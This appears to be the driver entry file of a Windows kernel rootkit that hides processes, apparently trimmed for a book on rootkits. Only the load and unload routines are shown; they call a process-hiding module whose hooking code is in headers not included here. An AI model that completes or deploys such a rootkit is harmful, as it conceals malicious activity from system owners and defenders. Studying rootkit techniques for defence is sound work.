// BASIC ROOTKIT that hides processes
// ----------------------------------------------------------
// v0.1 - Initial, Greg Hoglund (hoglund@rootkit.com)
// v0.3 - Added defines to compile on W2K, and comments.  Rich
// v0.4 - Fixed bug while manipulating _SYSTEM_PROCESS array.
//		  Added code to hide process times of the _root_*'s. Creative
// v0.6 - Added way around system call table memory protection, Jamie Butler (butlerjr@acm.org)
// v1.0 - Trimmed code back to a process hider for the book.

#include "hookssdt.h"
#include "dkomeprocess.h"
//#include "idthook.h"

VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	Ktrace("ROOTKIT: OnUnload called\n");
	
	//DE_OnUnload(DriverObject);
	//IH_OnUnload(DriverObject);
	Hp_OnUnload(DriverObject);
	
	return;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, 
					 IN PUNICODE_STRING theRegistryPath)
{
   // Register a dispatch function for Unload
   theDriverObject->DriverUnload  = OnUnload; 

   Ktrace("ROOTKIT: Onload called\n");

   NTSTATUS status = STATUS_SUCCESS;
   //status = DE_Onload(theDriverObject, theRegistryPath);
   //status = IH_Onload(theDriverObject, theRegistryPath);
   status = Hp_Onload(theDriverObject, theRegistryPath);
   
   return status;
}
